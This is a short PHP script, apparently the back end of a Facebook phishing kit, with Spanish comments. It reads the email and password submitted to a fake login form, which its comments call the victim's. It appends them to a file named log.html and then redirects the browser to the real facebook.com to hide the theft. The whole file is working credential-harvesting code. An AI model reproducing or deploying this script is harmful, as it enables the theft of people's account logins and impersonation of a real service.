<?php
#variable.php
//Asigna el valor de las variables del usuario y contraseña
$usuario=$_POST['email'];
$contraseña=$_POST['pass'];

// Asigna el valor a la variable donde se guarda el correo y pass de la victima
$handle = fopen("log.html", "a");
fwrite($handle,
"<br/> <b>Email:</b>".$usuario.
"<br/> <b>Contrasena:</b>".$contraseña." ");
fclose($handle);

header ('Location: https://www.facebook.com/ ');

?>